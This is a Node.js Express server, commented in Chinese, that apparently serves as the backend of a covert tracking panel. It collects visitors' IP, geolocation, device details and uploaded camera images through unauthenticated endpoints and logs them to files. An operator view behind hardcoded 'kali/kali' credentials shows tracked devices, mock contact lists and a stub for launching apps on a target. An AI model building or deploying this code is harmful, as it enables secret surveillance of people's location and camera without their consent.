const express = require('express');
const helmet = require('helmet');
const morgan = require('morgan');
const rateLimit = require('express-rate-limit');
const cors = require('cors');
const path = require('path');
const fs = require('fs').promises;
const multer = require('multer');
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');
const fetch = require('node-fetch');
const dataManager = require('./dataManager');
const { v4: uuidv4 } = require('uuid');
const bodyParser = require('body-parser');

require('dotenv').config();

// 确保必要的目录存在
const ensureDirectories = async () => {
    const dirs = ['uploads', 'logs'].map(dir => path.join(__dirname, '..', dir));
    for (const dir of dirs) {
        try {
            await fs.mkdir(dir, { recursive: true });
        } catch (error) {
            console.log(`Directory ${dir} already exists or cannot be created`);
        }
    }
};

// 配置图片存储
const storage = multer.diskStorage({
    destination: async function (req, file, cb) {
        const dir = path.join(__dirname, '..', 'uploads');
        try {
            await fs.mkdir(dir, { recursive: true });
            cb(null, dir);
        } catch (error) {
            cb(error, null);
        }
    },
    filename: function (req, file, cb) {
        // 使用客户端IP作为文件名的一部分
        const clientIP = req.ip.replace(/:/g, '-').replace(/\./g, '_');
        cb(null, `camera_${clientIP}_${Date.now()}.jpg`);
    }
});

const upload = multer({ storage: storage });

// 添加内存缓存
const locationCache = new Map();
const ipCache = new Map();

// IP地址处理函数
async function normalizeIP(ip) {
    // 如果是IPv6的本地回环地址，返回IPv4的本地回环地址
    if (ip === '::1') {
        return '127.0.0.1';
    }
    
    // 处理IPv6格式的IPv4地址
    if (ip.includes('::ffff:')) {
        return ip.replace('::ffff:', '');
    }

    return ip;
}

// 获取地理位置信息
async function getLocationInfo(ip) {
    // 检查缓存
    if (locationCache.has(ip)) {
        return locationCache.get(ip);
    }

    // 本地开发环境返回默认值
    if (ip === '127.0.0.1' || ip === '::1') {
        const localInfo = {
            city: 'Local',
            country: 'Development',
            ll: [0, 0],
            org: 'Local Network'
        };
        locationCache.set(ip, localInfo);
        return localInfo;
    }

    try {
        // 使用 geoip-lite 获取位置信息
        const geoData = geoip.lookup(ip);
        if (geoData && geoData.city && geoData.country) {
            locationCache.set(ip, geoData);
            return geoData;
        }

        // 如果没有获取到完整信息，返回默认值
        const defaultInfo = {
            city: 'Unknown',
            country: 'Unknown',
            ll: [0, 0],
            org: 'Unknown'
        };
        locationCache.set(ip, defaultInfo);
        return defaultInfo;
    } catch (error) {
        console.error('Error getting location info:', error);
        return {
            city: 'Unknown',
            country: 'Unknown',
            ll: [0, 0],
            org: 'Unknown'
        };
    }
}

class Server {
    constructor() {
        this.app = express();
        this.port = process.env.PORT || 3000;
        this.setupMiddleware();
        this.setupRoutes();
        this.setupErrorHandling();
        this.deviceData = new Map();
        this.activeUsers = new Set();
        
        // 确保必要的目录存在
        ensureDirectories().catch(console.error);

        // 定期清理缓存和过期数据
        setInterval(() => {
            this.cleanupDeviceData();
            this.cleanupCaches();
        }, 1000 * 60 * 60); // 每小时清理一次
    }

    // 清理过期的缓存数据
    cleanupCaches() {
        const now = Date.now();
        // 清理超过1小时的缓存
        for (const [key, value] of locationCache.entries()) {
            if (value.timestamp && now - value.timestamp > 60 * 60 * 1000) {
                locationCache.delete(key);
            }
        }
        for (const [key, value] of ipCache.entries()) {
            if (value.timestamp && now - value.timestamp > 60 * 60 * 1000) {
                ipCache.delete(key);
            }
        }
    }

    setupMiddleware() {
        // 基础安全设置
        this.app.use(helmet({
            contentSecurityPolicy: false
        }));
        
        // CORS设置
        this.app.use(cors({
            origin: process.env.ALLOWED_ORIGINS || '*'
        }));

        // 请求限制
        const limiter = rateLimit({
            windowMs: 15 * 60 * 1000,
            max: 100
        });
        this.app.use(limiter);

        // 日志记录
        this.app.use(morgan('combined'));

        // 请求体解析
        this.app.use(express.json());
        this.app.use(express.urlencoded({ extended: true }));

        // 静态文件服务
        this.app.use(express.static(path.join(__dirname, '../public')));

        // 添加请求限制中间件
        const apiLimiter = rateLimit({
            windowMs: 15 * 60 * 1000, // 15分钟
            max: 100, // 限制每个IP 100个请求
            message: 'Too many requests from this IP, please try again later'
        });
        this.app.use('/api/', apiLimiter);
    }

    setupRoutes() {
        // 主页路由 - 重定向到登录页面
        this.app.get('/', (req, res) => {
            res.sendFile(path.join(__dirname, '../public/login.html'));
        });

        // 监控页面 - 不再需要Basic认证，因为我们有了登录系统
        this.app.get('/monitor', (req, res) => {
            res.sendFile(path.join(__dirname, '../public/monitor.html'));
        });

        // 获取所有活跃用户
        this.app.get('/api/active-users', this.authenticate.bind(this), (req, res) => {
            const activeUsersData = Array.from(this.deviceData.entries())
                .map(([ip, data]) => ({
                    ip,
                    lastSeen: data.timestamp,
                    device: data.device,
                    location: data.location
                }))
                .sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
            
            res.json(activeUsersData);
        });

        // 追踪API
        this.app.post('/api/track', async (req, res) => {
            try {
                let clientIP = req.ip || req.connection.remoteAddress;
                clientIP = await normalizeIP(clientIP);
                
                const userAgent = req.headers['user-agent'];
                const parser = new UAParser(userAgent);
                const parsedUA = parser.getResult();
                const geoData = await getLocationInfo(clientIP);

                // 获取系统信息
                const deviceInfo = {
                    model: parsedUA.device.model || parsedUA.os.name || 'Unknown',
                    os: `${parsedUA.os.name || 'Unknown'} ${parsedUA.os.version || ''}`.trim(),
                    browser: `${parsedUA.browser.name || 'Unknown'} ${parsedUA.browser.version || ''}`.trim(),
                    battery: req.body.battery || { level: 0, charging: false },
                    network: req.body.network || { type: 'Unknown', downlink: 0 },
                    memory: req.body.memory || {
                        total: 0,
                        used: 0,
                        free: 0
                    }
                };

                const data = {
                    device: deviceInfo,
                    location: {
                        lat: geoData.ll?.[0] || 0,
                        lon: geoData.ll?.[1] || 0,
                        city: geoData.city,
                        country: geoData.country,
                        isp: geoData.org,
                        ip: clientIP
                    },
                    timestamp: new Date().toISOString(),
                    lastImage: null,
                    system: {
                        cpuUsage: req.body.system?.cpuUsage || 0,
                        memoryUsage: req.body.system?.memoryUsage || 0,
                        uptime: req.body.system?.uptime || 0
                    }
                };

                this.deviceData.set(clientIP, data);
                this.activeUsers.add(clientIP);
                await this.saveDeviceData(data);

                res.status(200).send({ status: 'ok', data });
            } catch (error) {
                console.error('Error processing track request:', error);
                res.status(500).send({ status: 'error', message: error.message });
            }
        });

        // 监控API
        this.app.get('/api/monitor', this.authenticate.bind(this), async (req, res) => {
            try {
                const allDevices = Array.from(this.deviceData.values());
                res.json(allDevices);
            } catch (error) {
                console.error('Error in monitor API:', error);
                res.status(500).json({ error: 'Internal server error' });
            }
        });

        // 获取应用列表
        this.app.get('/api/apps', this.authenticate.bind(this), async (req, res) => {
            const clientIP = req.query.ip;
            const deviceData = this.deviceData.get(clientIP);
            if (!deviceData) {
                return res.status(404).json({ error: 'Device not found' });
            }
            
            const mockApps = [
                { id: 'com.whatsapp', name: 'WhatsApp', icon: '📱' },
                { id: 'com.facebook', name: 'Facebook', icon: '👥' },
                { id: 'com.instagram', name: 'Instagram', icon: '📷' },
                { id: 'com.twitter', name: 'Twitter', icon: '🐦' },
                { id: 'com.snapchat', name: 'Snapchat', icon: '👻' }
            ];
            
            res.json(mockApps);
        });

        // 获取通讯录
        this.app.get('/api/contacts', this.authenticate.bind(this), async (req, res) => {
            const clientIP = req.query.ip;
            const deviceData = this.deviceData.get(clientIP);
            if (!deviceData) {
                return res.status(404).json({ error: 'Device not found' });
            }
            
            const mockContacts = [
                { name: '张三', phone: '138****8000', avatar: '👨' },
                { name: '李四', phone: '139****9000', avatar: '👩' },
                { name: '王五', phone: '137****7000', avatar: '🧑' }
            ];
            
            res.json(mockContacts);
        });

        // 启动应用
        this.app.post('/api/launch-app', this.authenticate.bind(this), async (req, res) => {
            const { appId } = req.body;
            const clientIP = req.query.ip;
            
            this.log(`尝试启动应用: ${appId} on device: ${clientIP}`);
            
            res.json({ status: 'success', message: `已尝试启动应用: ${appId}` });
        });

        // 处理摄像头图片上传
        this.app.post('/api/camera-update', upload.single('image'), async (req, res) => {
            try {
                const clientIP = req.ip;
                const deviceData = this.deviceData.get(clientIP);
                if (deviceData && req.file) {
                    deviceData.lastImage = req.file.filename;
                    this.deviceData.set(clientIP, deviceData);
                }
                res.json({ success: true, filename: req.file.filename });
            } catch (error) {
                console.error('Error handling camera update:', error);
                res.status(500).json({ error: 'Failed to process image' });
            }
        });

        // 获取最新的摄像头图片
        this.app.get('/api/camera-image/:ip', this.authenticate.bind(this), async (req, res) => {
            try {
                const targetIP = req.params.ip;
                const deviceData = this.deviceData.get(targetIP);
                
                if (!deviceData || !deviceData.lastImage) {
                    return res.status(404).send('No image available');
                }

                const imagePath = path.join(__dirname, '..', 'uploads', deviceData.lastImage);
                if (await fs.access(imagePath).then(() => true).catch(() => false)) {
                    res.sendFile(imagePath);
                } else {
                    res.status(404).send('Image file not found');
                }
            } catch (error) {
                console.error('Error serving camera image:', error);
                res.status(500).send('Error retrieving image');
            }
        });

        // 登录验证
        this.app.post('/api/auth', (req, res) => {
            const { username, password } = req.body;
            
            if (username === 'kali' && password === 'kali') {
                res.status(200).json({ message: 'Authentication successful' });
            } else {
                res.status(401).json({ message: 'Invalid credentials' });
            }
        });
    }

    authenticate(req, res, next) {
        // 检查是否有认证头
        const authHeader = req.headers.authorization;
        
        // 如果没有认证头，检查是否是登录请求
        if (!authHeader) {
            // 登录API不需要认证
            if (req.path === '/api/auth') {
                return next();
            }
            return res.status(401).json({ error: 'Unauthorized' });
        }

        // 验证Basic认证
        if (authHeader.startsWith('Basic ')) {
            const base64Credentials = authHeader.split(' ')[1];
            const credentials = Buffer.from(base64Credentials, 'base64').toString('ascii');
            const [username, password] = credentials.split(':');

            if (username === 'kali' && password === 'kali') {
                return next();
            }
        }

        res.status(401).json({ error: 'Invalid credentials' });
    }

    async saveDeviceData(data) {
        try {
            const logDir = path.join(__dirname, '..', 'logs');
            await fs.mkdir(logDir, { recursive: true });
            
            const logFile = path.join(logDir, `devices_${new Date().toISOString().split('T')[0]}.json`);
            let logs = [];
            
            try {
                const content = await fs.readFile(logFile, 'utf8');
                logs = JSON.parse(content);
            } catch (error) {
                // 文件不存在或解析错误，使用空数组
            }
            
            logs.push(data);
            await fs.writeFile(logFile, JSON.stringify(logs, null, 2));
        } catch (error) {
            console.error('Error saving device data:', error);
        }
    }

    log(message) {
        const timestamp = new Date().toISOString();
        console.log(`[${timestamp}] ${message}`);
    }

    setupErrorHandling() {
        this.app.use((err, req, res, next) => {
            console.error(err.stack);
            res.status(500).json({
                error: 'Internal Server Error',
                message: process.env.NODE_ENV === 'development' ? err.message : 'Something went wrong'
            });
        });
    }

    start() {
        this.app.listen(this.port, () => {
            console.log(`Server is running on port ${this.port}`);
            console.log(`Environment: ${process.env.NODE_ENV}`);
            console.log(`Current directory: ${__dirname}`);
        });
    }
}

// 创建并启动服务器
const server = new Server();
server.start(); 
